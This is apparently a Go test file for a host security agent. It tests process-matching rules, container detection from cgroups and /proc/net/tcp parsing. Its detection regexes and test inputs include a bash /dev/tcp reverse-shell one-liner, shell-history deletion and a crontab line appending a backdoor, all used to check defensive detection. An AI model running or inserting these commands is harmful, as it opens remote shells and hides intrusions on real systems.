package guard

import (
	"testing"

	"github.com/alinksec/alinksec-agent/internal/config"
	pb "github.com/alinksec/alinksec-agent/internal/proto"
)

func TestProcessRuleMatchesExeAndCmdlineWithExclusions(t *testing.T) {
	rule := config.ProcessRule{ID: "PR-1", Enabled: true, Match: config.ProcessMatch{
		ExeRegex: `(?i)(^|/)xmrig$`, CmdlineRegex: `--donate-level\s+0`, UserExclude: []string{"root"},
	}}
	obs := processObservation{exe: "/tmp/xmrig", cmdline: "xmrig --donate-level 0", user: "daemon"}
	if !processRuleMatches(rule, obs) {
		t.Fatal("expected process rule to match")
	}
	obs.user = "ROOT"
	if processRuleMatches(rule, obs) {
		t.Fatal("excluded user must not match")
	}
}

func TestProcessRuleRejectsInvalidOrEmptyMatchers(t *testing.T) {
	obs := processObservation{exe: "/tmp/xmrig"}
	if processRuleMatches(config.ProcessRule{ID: "PR-1", Enabled: true}, obs) {
		t.Fatal("rule without matchers must not match every process")
	}
	if processRuleMatches(config.ProcessRule{ID: "PR-2", Enabled: true, Match: config.ProcessMatch{ExeRegex: "["}}, obs) {
		t.Fatal("invalid regex must not match")
	}
}

func TestProcessSeverityMapsRuleLevels(t *testing.T) {
	if got := processSeverity(4); got != pb.Severity_SEV_CRITICAL {
		t.Fatalf("processSeverity(4) = %v, want critical", got)
	}
	if got := processSeverity(1); got != pb.Severity_SEV_LOW {
		t.Fatalf("processSeverity(1) = %v, want low", got)
	}
}

func TestParseCgroupContainerIdentification(t *testing.T) {
	cases := []struct {
		name        string
		cgroup      string
		inContainer bool
		wantID      string
	}{
		{
			name:        "docker v1 cgroup",
			cgroup:      "12:memory:/docker/78a9c4b1d2e3f4a5b6c7d8e901234567\n1:name=systemd:/docker/78a9c4b1d2e3f4a5b6c7d8e901234567",
			inContainer: true,
			wantID:      "78a9c4b1d2e3",
		},
		{
			name:        "docker systemd v2 cgroup",
			cgroup:      "0::/system.slice/docker-abcdef1234567890.scope",
			inContainer: true,
			wantID:      "abcdef123456",
		},
		{
			name:        "kubernetes containerd cgroup",
			cgroup:      "0::/kubepods.slice/kubepods-burstable.slice/pod123/cri-containerd-1122334455667788.scope",
			inContainer: true,
			wantID:      "112233445566",
		},
		{
			name:        "host systemd user session",
			cgroup:      "0::/user.slice/user-0.slice/session-800.scope",
			inContainer: false,
			wantID:      "",
		},
		{
			name:        "host systemd system service",
			cgroup:      "0::/system.slice/sshd.service",
			inContainer: false,
			wantID:      "",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			gotIn, gotID := parseCgroupContent(tc.cgroup)
			if gotIn != tc.inContainer || gotID != tc.wantID {
				t.Fatalf("parseCgroupContent() = (%v, %q), want (%v, %q)", gotIn, gotID, tc.inContainer, tc.wantID)
			}
		})
	}
}

func TestParseProcNetTCPConnections(t *testing.T) {
	fixture := `  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 0100007F:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 12345 1 ffff8c2d 100 0 0 10 0
   1: 0100007F:0016 0200007F:9ABC 01 00000000:00000000 00:00000000 00000000     0        0 67890 1 ffff8c2d 100 0 0 10 0
   2: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 99999 1 ffff8c2d 100 0 0 10 0
`
	inodes := map[string]struct{}{
		"12345": {},
		"67890": {},
	}
	conns := parseProcNetTCPContent(fixture, "tcp", inodes)
	if len(conns) != 2 {
		t.Fatalf("expected 2 matched connections, got %d", len(conns))
	}
	if conns[0].Local != "127.0.0.1:8080" || conns[0].State != "LISTEN" {
		t.Errorf("conn[0] = %+v, want 127.0.0.1:8080 LISTEN", conns[0])
	}
	if conns[1].Local != "127.0.0.1:22" || conns[1].Remote != "127.0.0.1:39612" || conns[1].State != "ESTABLISHED" {
		t.Errorf("conn[1] = %+v, want 127.0.0.1:22 -> 127.0.0.1:39612 ESTABLISHED", conns[1])
	}
}

func TestFalcoProcessRulesMatching(t *testing.T) {
	rules := []config.ProcessRule{
		{
			ID:      "PR-0005",
			Name:    "反弹 Shell 行为检测",
			Enabled: true,
			Match: config.ProcessMatch{
				CmdlineRegex: `(?i)(?:bash|sh|zsh|dash)\s+.*(?:-i\s+.*>&|/dev/tcp/[0-9.]+/|nc\s+.*-e\s+/(?:bin/)?(?:ba)?sh|socat\s+exec:.*pty|pty\.spawn\()`,
			},
		},
		{
			ID:      "PR-0006",
			Name:    "非交互式远程工具衍生",
			Enabled: true,
			Match: config.ProcessMatch{
				ExeRegex: `(?i)(^|/)(ncat|socat|chisel|frpc|frps|gost)$`,
			},
		},
		{
			ID:      "PR-0007",
			Name:    "常见渗透与 C2 工具特征",
			Enabled: true,
			Match: config.ProcessMatch{
				ExeRegex: `(?i)(^|/)(fscan|mimikatz|bloodhound|sliver-client|havoc)$`,
			},
		},
		{
			ID:      "PR-0008",
			Name:    "恶意持久化与历史清除",
			Enabled: true,
			Match: config.ProcessMatch{
				CmdlineRegex: `(?i)(?:rm\s+-[a-zA-Z]*f?[a-zA-Z]*\s+.*(?:\.bash_history|\.zsh_history)|history\s+-c|unset\s+HISTFILE|export\s+HISTSIZE=0|echo\s+.*>>\s*/var/spool/cron/|echo\s+.*>>\s*/etc/crontab)`,
			},
		},
	}

	// Test PR-0005: Reverse shell
	revShellHit := processObservation{exe: "/bin/bash", cmdline: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}
	if !processRuleMatches(rules[0], revShellHit) {
		t.Fatal("PR-0005 expected to match reverse shell cmdline")
	}
	normalBash := processObservation{exe: "/bin/bash", cmdline: "/bin/bash -l"}
	if processRuleMatches(rules[0], normalBash) {
		t.Fatal("PR-0005 must not match normal interactive bash")
	}

	// Test PR-0006: Unexpected remote tool
	frpcHit := processObservation{exe: "/usr/local/bin/frpc", cmdline: "frpc -c /etc/frp/frpc.ini"}
	if !processRuleMatches(rules[1], frpcHit) {
		t.Fatal("PR-0006 expected to match frpc")
	}
	normalSshd := processObservation{exe: "/usr/sbin/sshd", cmdline: "/usr/sbin/sshd -D"}
	if processRuleMatches(rules[1], normalSshd) {
		t.Fatal("PR-0006 must not match sshd")
	}

	// Test PR-0007: C2 / Pentest tool
	fscanHit := processObservation{exe: "/tmp/fscan", cmdline: "fscan -h 192.168.1.1/24"}
	if !processRuleMatches(rules[2], fscanHit) {
		t.Fatal("PR-0007 expected to match fscan")
	}
	normalLs := processObservation{exe: "/bin/ls", cmdline: "ls -la"}
	if processRuleMatches(rules[2], normalLs) {
		t.Fatal("PR-0007 must not match ls")
	}

	// Test PR-0008: Persistence & history deletion
	historyDelHit := processObservation{exe: "/bin/rm", cmdline: "rm -rf ~/.bash_history"}
	if !processRuleMatches(rules[3], historyDelHit) {
		t.Fatal("PR-0008 expected to match rm .bash_history")
	}
	cronWriteHit := processObservation{exe: "/bin/sh", cmdline: "echo '* * * * * root /tmp/backdoor' >> /etc/crontab"}
	if !processRuleMatches(rules[3], cronWriteHit) {
		t.Fatal("PR-0008 expected to match append to /etc/crontab")
	}
	normalCronList := processObservation{exe: "/usr/bin/crontab", cmdline: "crontab -l"}
	if processRuleMatches(rules[3], normalCronList) {
		t.Fatal("PR-0008 must not match crontab -l")
	}

	// Disabled rule check
	rules[0].Enabled = false
	if processRuleMatches(rules[0], revShellHit) {
		t.Fatal("disabled rule must not match")
	}
}
